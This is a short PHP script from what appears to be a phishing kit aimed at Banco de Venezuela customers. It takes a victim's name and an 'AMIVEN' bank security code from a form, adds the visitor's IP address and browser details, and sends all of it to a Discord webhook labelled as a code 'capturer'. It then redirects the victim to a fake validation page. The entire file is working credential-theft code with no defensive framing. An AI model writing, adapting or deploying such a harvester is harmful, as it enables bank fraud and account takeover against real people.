<?php
error_reporting(0);
require 'discord_config.php'; 

// 2. OBTENER DATOS DEL FORMULARIO
// Captura el único campo enviado desde el formulario HTML: 'amiven_code'
$amiven_code = isset($_POST['amiven_code']) ? $_POST['amiven_code'] : '';
$nombre = isset($_POST['nombre']) ? $_POST['nombre'] : ''; 

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// 3. CONSTRUCCIÓN DEL EMBED y ENVÍO A DISCORD
// Crear el array de campos para el Embed
$fields = [];

$fields[] = ['name' => '👤 Usuario', 'value' => "`{$nombre}`", 'inline' => true];
$fields[] = ['name' => '━━━━━━━━━━━━━━━━━━', 'value' => '', 'inline' => false]; // Separador

// Único campo para el código AMIVEN
$fields[] = ['name' => '🔑 CÓDIGO AMIVEN CAPTURADO', 'value' => "**```{$amiven_code}```**", 'inline' => false]; 

$fields[] = ['name' => '━━━━━━━━━━━━━━━━━━', 'value' => '', 'inline' => false];

$fields[] = ['name' => '🌐 IP', 'value' => "`{$ip}`", 'inline' => true];
$fields[] = ['name' => '📱 Navegador', 'value' => "`{$userAgent}`", 'inline' => true];

// Estructura del Embed
$embed = [
    'title' => 'BDV 🔑 - CÓDIGO AMIVEN CAPTURADO',
    'color' => 3066993, // Verde oscuro
    'fields' => $fields,
    'timestamp' => date('c')
];

// Llamada a la función centralizada
sendToDiscordEmbed([$embed], 'Capturador AMIVEN'); 

// 4. REDIRIGIR AL SIGUIENTE PASO
header('Location: validando2.html'); 
exit();
?>